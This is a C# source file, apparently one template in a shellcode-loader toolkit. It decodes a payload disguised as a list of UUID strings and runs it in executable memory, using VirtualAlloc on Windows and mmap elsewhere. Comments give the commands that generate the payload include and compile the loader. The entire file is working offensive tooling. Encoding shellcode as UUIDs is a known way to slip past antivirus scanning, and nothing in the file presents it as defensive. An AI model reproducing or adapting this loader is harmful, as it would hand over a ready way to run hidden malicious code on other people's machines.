/*
 * uuid_loader.cs - UUID-string shellcode loader template (C#)
 * ===========================================================
 * Decrypts an embedded list of UUID strings (bytes_le / GUID layout,
 * 16 bytes per UUID, zero-padded) back into shellcode and executes it.
 * No key material is involved.
 *
 * Regenerate the payload include with the builder:
 *   python3 tools/gen_inc.py uuid 300 --lang cs --out loaders/csharp/uuid/payload_inc.cs
 *
 * Compile (mono):
 *   mcs -out:uuid_loader.exe uuid_loader.cs payload_inc.cs
 *   mono uuid_loader.exe
 *
 * GUID byte layout (matches Python uuid.UUID(bytes_le=...).bytes_le and
 * System.Guid.ToByteArray()):
 *   aabbccdd-eeff-0011-2233-445566778899  ->  dd cc bb aa ff ee 11 00 22 33 ...
 */
using System;
using System.Runtime.InteropServices;

static class UuidLoader
{
    /* Guid.Parse().ToByteArray() yields bytes_le, the exact layout the
       builder used (uuid.UUID(bytes_le=...).bytes_le), so no manual
       byte shuffling is required. The padded buffer is truncated to
       kOriginalLen before execution. */
    static byte[] Decrypt(string[] uuids)
    {
        byte[] padded = new byte[uuids.Length * 16];
        for (int i = 0; i < uuids.Length; i++)
            Guid.Parse(uuids[i]).ToByteArray().CopyTo(padded, i * 16);
        byte[] code = new byte[Payload.OriginalLen];
        Array.Copy(padded, code, Payload.OriginalLen);
        return code;
    }

    /* ---------------- execution method (shared by all templates) ------- */

    delegate int PayloadFn();

    static bool IsWindows
    {
        get
        {
            PlatformID p = Environment.OSVersion.Platform;
            return p == PlatformID.Win32NT || p == PlatformID.Win32Windows || p == PlatformID.WinCE;
        }
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, uint type, uint protect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr addr, UIntPtr size, uint freeType);

    [DllImport("libc", SetLastError = true)]
    static extern IntPtr mmap(IntPtr addr, UIntPtr length, int prot, int flags, int fd, IntPtr offset);

    [DllImport("libc", SetLastError = true)]
    static extern int munmap(IntPtr addr, UIntPtr length);

    static int Run(byte[] shellcode)
    {
        IntPtr mem;
        if (IsWindows)
        {
            mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, 0x3000 /*MEM_COMMIT|MEM_RESERVE*/,
                               0x40 /*PAGE_EXECUTE_READWRITE*/);
            if (mem == IntPtr.Zero) { Console.WriteLine("[-] VirtualAlloc failed"); return -1; }
        }
        else
        {
            mem = mmap(IntPtr.Zero, (UIntPtr)shellcode.Length,
                       0x7 /*PROT_READ|PROT_WRITE|PROT_EXEC*/,
                       0x22 /*MAP_PRIVATE|MAP_ANONYMOUS*/, -1, IntPtr.Zero);
            if (mem == new IntPtr(-1)) { Console.WriteLine("[-] mmap failed"); return -1; }
        }
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        int r = ((PayloadFn)Marshal.GetDelegateForFunctionPointer(mem, typeof(PayloadFn)))();
        if (IsWindows)
            VirtualFree(mem, UIntPtr.Zero, 0x8000 /*MEM_RELEASE*/);
        else
            munmap(mem, (UIntPtr)shellcode.Length);
        return r;
    }

    public static void Main()
    {
        byte[] plain = Decrypt(Payload.Data);
        Console.WriteLine("[+] UUID decoded " + Payload.Count + " strings -> "
                          + (Payload.Count * 16) + " bytes (orig " + Payload.OriginalLen + ")");
        int r = Run(plain);
        Console.WriteLine("[+] payload returned " + r);
    }
}
